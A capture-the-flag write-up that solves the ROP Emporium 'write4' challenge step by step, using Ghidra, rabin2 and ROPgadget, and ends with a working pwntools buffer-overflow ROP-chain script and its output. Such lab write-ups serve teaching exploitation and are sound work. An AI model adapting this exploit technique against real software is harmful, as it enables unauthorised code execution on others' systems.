# write4 Writeup

## Steps:
1. Run write4. Based on the instructions, our general plan is to write to memory then call `print_file()` with `flag.txt` as the argument
```
$ ./write4 
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> AAAA   
Thank you!
```

2. Analyze in ghidra.

Notice function `usefulFunction` - we need to use print_file with a different argument for this challenge
```
void usefulFunction(void)

{
  print_file("nonexistent");
  return;
}
```
We identify the address of `print_file` to be `0x400510`
```
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined print_file()
                               Thunked-Function: <EXTERNAL>::print_file
             undefined         <UNASSIGNED>   <RETURN>
                             <EXTERNAL>::print_file                          XREF[1]:     print_file:00400510(T), 
                                                                                          print_file:00400510(c)  
        00602018                 ??         ??

```
3. Determine where to write the string - below we see that the `.data` and `.bss` sections have read and write permissions
```
$ rabin2 -Sg write4
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
ERROR: Missing bin header dwarf
[Sections]

nth paddr        size vaddr       vsize perm type        name
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- NULL
1   0x00000238   0x1c 0x00400238   0x1c -r-- PROGBITS    .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- NOTE        .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- NOTE        .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- GNU_HASH    .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- DYNSYM      .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c -r-- STRTAB      .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 -r-- GNU_VERSYM  .gnu.version
8   0x00000450   0x20 0x00400450   0x20 -r-- GNU_VERNEED .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 -r-- RELA        .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 -r-- RELA        .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 -r-x PROGBITS    .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x PROGBITS    .plt
13  0x00000520  0x182 0x00400520  0x182 -r-x PROGBITS    .text
14  0x000006a4    0x9 0x004006a4    0x9 -r-x PROGBITS    .fini
15  0x000006b0   0x10 0x004006b0   0x10 -r-- PROGBITS    .rodata
16  0x000006c0   0x44 0x004006c0   0x44 -r-- PROGBITS    .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 -r-- PROGBITS    .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- INIT_ARRAY  .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- FINI_ARRAY  .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- PROGBITS    .got
22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss
25  0x00001038   0x29 0x00000000   0x29 ---- PROGBITS    .comment
26  0x00001068  0x618 0x00000000  0x618 ---- SYMTAB      .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 ---- STRTAB      .strtab
28  0x00001876  0x103 0x00000000  0x103 ---- STRTAB      .shstrtab
```

4. As the instructions hint, look for a `mov [reg], reg` to write somewhere in memory and a way to `pop` into the registers it uses. Last, we will need a `pop rdi` to send the argument to the `print_file` function.
>rdi:    First Argument
>
>rsi:    Second Argument
>
>rdx:    Third Argument
>
```
$ ROPgadget --binary write4 | grep 'mov'
0x0000000000400628 : mov qword ptr [r14], r15 ; ret

$ ROPgadget --binary write4 | grep 'pop'
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400693 : pop rdi ; ret
```
6. Create the payload:
   - 40 bytes of garbage
   - pop r14, r15
   - location to write string (.bss in this example, but .data works too)
   - "flag.txt"
   - mov
   - pop rdi
   - string location
   - print_flag
```
from pwn import *

p = process('./write4')
# gdb.attach(p, gdbscript='b *main')

pop_1415 = p64(0x400690)
r14 = p64(0x601038)
r15 = b"flag.txt"
mov = p64(0x400628)
pop_rdi = p64(0x400693)
print_f = p64(0x400510)

payload = b"A" * 40
payload += pop_1415 + r14 + r15
payload += mov
payload += pop_rdi + r14
payload += print_f

p.sendline(payload)


# p.interactive()
print(p.recvall().decode('utf-8'))
```

## Solution:
```
$ python3 exploit.py
[+] Starting local process './write4': pid 4042
[+] Receiving all data: Done (118B)
[*] Process './write4' stopped with exit code -11 (SIGSEGV) (pid 4042)
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
```
                            
